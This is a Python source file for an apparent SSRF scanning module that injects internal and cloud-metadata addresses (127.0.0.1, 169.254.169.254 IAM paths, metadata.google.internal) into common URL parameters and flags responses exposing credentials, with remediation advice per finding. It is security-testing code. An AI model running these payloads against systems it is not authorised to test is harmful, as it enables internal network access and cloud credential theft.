import requests
from urllib.parse import urljoin, urlparse, quote
from colorama import Fore, Style, init

init(autoreset=True)


class SSRFAgent:
    def __init__(self, target_url, session=None):
        self.target = target_url
        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': (
                'SecurityAudit/1.0 '
                '(Authorized Assessment)'
            )
        })
        self.findings = []

    def _find_ssrf_params(self):
        ssrf_param_names = [
            'url', 'uri', 'link', 'src',
            'source', 'dest', 'destination',
            'redirect', 'return', 'callback',
            'next', 'data', 'reference', 'site',
            'html', 'fetch', 'path', 'continue',
            'window', 'load', 'file', 'feed',
            'host', 'proxy', 'request', 'domain',
        ]
        return ssrf_param_names

    def test_internal_ip_access(self, url):
        print(
            f"  {Fore.CYAN}[*] Testing SSRF - "
            f"internal IP access..."
            f"{Style.RESET_ALL}"
        )
        internal_targets = [
            'http://127.0.0.1',
            'http://localhost',
            'http://0.0.0.0',
            'http://[::1]',
            'http://169.254.169.254',
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/iam/',
            'http://metadata.google.internal/',
            'http://100.100.100.200/latest/meta-data/',
        ]

        cloud_indicators = [
            'ami-id', 'instance-id',
            'local-ipv4', 'iam',
            'computeMetadata', 'meta-data',
            'security-credentials',
            'project-id', 'service-accounts',
        ]

        ssrf_params = self._find_ssrf_params()
        parsed = urlparse(url)

        params_to_test = {}
        if parsed.query:
            for p in parsed.query.split('&'):
                if '=' in p:
                    k, v = p.split('=', 1)
                    if k.lower() in ssrf_params:
                        params_to_test[k] = v

        if not params_to_test:
            params_to_test = {
                p: 'https://example.com'
                for p in ssrf_params[:3]
            }

        for param, _ in params_to_test.items():
            for internal in internal_targets[:5]:
                test_url = (
                    f"{parsed.scheme}://"
                    f"{parsed.netloc}"
                    f"{parsed.path}"
                    f"?{param}={quote(internal)}"
                )
                try:
                    r = self.session.get(
                        test_url, timeout=10
                    )
                    for indicator in cloud_indicators:
                        if indicator in r.text:
                            self.findings.append({
                                'type': 'SSRF - Cloud Metadata',
                                'category': 'ssrf',
                                'risk': 'CRITICAL',
                                'url': test_url,
                                'parameter': param,
                                'internal_target': internal,
                                'evidence': indicator,
                                'description': (
                                    f'SSRF fetches cloud '
                                    f'metadata via "{param}". '
                                    f'Evidence: {indicator}'
                                ),
                                'business_impact': (
                                    'AWS/GCP credentials exposed. '
                                    'Full cloud infrastructure '
                                    'at risk. Data breach imminent.'
                                ),
                                'fix': (
                                    '1. Validate/whitelist URLs\n'
                                    '2. Block internal IPs\n'
                                    '3. Use DNS allowlist\n'
                                    '4. Disable metadata endpoint\n'
                                    '5. Use IMDSv2 on AWS'
                                ),
                                'cvss_score': 9.8,
                                'cwe': 'CWE-918'
                            })
                            print(
                                f"  {Fore.RED}"
                                f"[!!!] SSRF CLOUD METADATA!"
                                f"{Style.RESET_ALL}"
                            )
                            break

                    if (
                        r.status_code == 200
                        and 'localhost' in r.text.lower()
                    ):
                        self.findings.append({
                            'type': 'SSRF - Internal Access',
                            'category': 'ssrf',
                            'risk': 'HIGH',
                            'url': test_url,
                            'parameter': param,
                            'internal_target': internal,
                            'description': (
                                f'SSRF to {internal} '
                                f'returned 200. '
                                f'Internal access possible.'
                            ),
                            'business_impact': (
                                'Attacker can scan internal '
                                'network and access '
                                'internal services'
                            ),
                            'fix': (
                                '1. Whitelist allowed URLs\n'
                                '2. Block RFC1918 addresses\n'
                                '3. Use egress firewall'
                            ),
                            'cvss_score': 8.6,
                            'cwe': 'CWE-918'
                        })
                except Exception:
                    pass

        return self.findings

    def run_full_scan(self, urls_to_test=None):
        print(
            f"\n{Fore.YELLOW}[SSRF AGENT] "
            f"Starting...{Style.RESET_ALL}"
        )
        test_urls = urls_to_test or [self.target]
        for url in test_urls:
            self.test_internal_ip_access(url)
        print(
            f"{Fore.GREEN}[SSRF AGENT] Complete - "
            f"{len(self.findings)} findings"
            f"{Style.RESET_ALL}"
        )
        return self.findings
